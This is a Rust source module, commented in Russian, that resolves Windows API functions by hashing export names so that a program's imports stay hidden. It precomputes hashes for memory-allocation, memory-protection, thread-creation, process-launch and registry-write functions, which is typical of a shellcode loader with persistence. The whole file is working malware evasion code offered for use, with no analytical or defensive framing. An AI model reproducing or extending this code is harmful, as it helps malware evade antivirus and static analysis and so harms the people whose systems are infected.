// резолвинг апи по хэшу, прячем импорты
use std::ffi::CString;
use winapi::um::libloaderapi::GetModuleHandleA;
use winapi::shared::minwindef::HMODULE;

// fnv1a в compile time
const fn fnv1a_hash(s: &[u8]) -> u32 {
    let mut hash = 0x811c9dc5u32;
    let mut i = 0;
    while i < s.len() {
        hash ^= s[i] as u32;
        hash = hash.wrapping_mul(0x01000193);
        i += 1;
    }
    hash
}

// ищем функцию по хэшу в указаном модуле
pub unsafe fn resolve_api(module: &str, hash: u32) -> Option<*const ()> {
    let module_cstr = CString::new(module).ok()?;
    let hmodule = GetModuleHandleA(module_cstr.as_ptr());

    if hmodule.is_null() {
        return None;
    }

    find_export_by_hash(hmodule, hash)
}

// обходим export table и матчим по хэшу имени
unsafe fn find_export_by_hash(module: HMODULE, target_hash: u32) -> Option<*const ()> {
    use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS, IMAGE_EXPORT_DIRECTORY};

    let dos_header = module as *const IMAGE_DOS_HEADER;
    let nt_headers = (module as usize + (*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS;

    let export_dir_rva = (*nt_headers).OptionalHeader.DataDirectory[0].VirtualAddress;
    if export_dir_rva == 0 {
        return None;
    }

    let export_dir = (module as usize + export_dir_rva as usize) as *const IMAGE_EXPORT_DIRECTORY;

    let names = std::slice::from_raw_parts(
        (module as usize + (*export_dir).AddressOfNames as usize) as *const u32,
        (*export_dir).NumberOfNames as usize,
    );

    let functions = std::slice::from_raw_parts(
        (module as usize + (*export_dir).AddressOfFunctions as usize) as *const u32,
        (*export_dir).NumberOfFunctions as usize,
    );

    let ordinals = std::slice::from_raw_parts(
        (module as usize + (*export_dir).AddressOfNameOrdinals as usize) as *const u16,
        (*export_dir).NumberOfNames as usize,
    );

    for i in 0..(*export_dir).NumberOfNames as usize {
        let name_rva = names[i];
        let name_ptr = (module as usize + name_rva as usize) as *const i8;

        // читаем имя и считаем хэш
        let mut name_bytes = Vec::new();
        let mut j = 0;
        loop {
            let c = *name_ptr.offset(j);
            if c == 0 {
                break;
            }
            name_bytes.push(c as u8);
            j += 1;
        }

        let hash = fnv1a_hash(&name_bytes);

        if hash == target_hash {
            let ordinal = ordinals[i] as usize;
            let func_rva = functions[ordinal];
            let func_addr = (module as usize + func_rva as usize) as *const ();
            return Some(func_addr);
        }
    }

    None
}

// хэши часто используемых апи, считаются при компиляции
pub const HASH_VIRTUALALLOC: u32 = fnv1a_hash(b"VirtualAlloc");
pub const HASH_VIRTUALPROTECT: u32 = fnv1a_hash(b"VirtualProtect");
pub const HASH_CREATETHREAD: u32 = fnv1a_hash(b"CreateThread");
pub const HASH_WAITFORSINGLEOBJECT: u32 = fnv1a_hash(b"WaitForSingleObject");
pub const HASH_LOADLIBRARYA: u32 = fnv1a_hash(b"LoadLibraryA");
pub const HASH_GETPROCADDRESS: u32 = fnv1a_hash(b"GetProcAddress");
pub const HASH_VIRTUALFREE: u32 = fnv1a_hash(b"VirtualFree");
pub const HASH_CREATEPROCESSA: u32 = fnv1a_hash(b"CreateProcessA");
pub const HASH_SHELLEXECUTEW: u32 = fnv1a_hash(b"ShellExecuteW");
pub const HASH_REGCREATEKEYEXA: u32 = fnv1a_hash(b"RegCreateKeyExA");
pub const HASH_REGSETVALUEEXA: u32 = fnv1a_hash(b"RegSetValueExA");

// макрос для удобного вызова через хэш
#[macro_export]
macro_rules! call_hashed_api {
    ($module:expr, $hash:expr, $fn_type:ty) => {{
        unsafe {
            let addr = $crate::api_hash::resolve_api($module, $hash)?;
            let func: $fn_type = std::mem::transmute(addr);
            Some(func)
        }
    }};
}
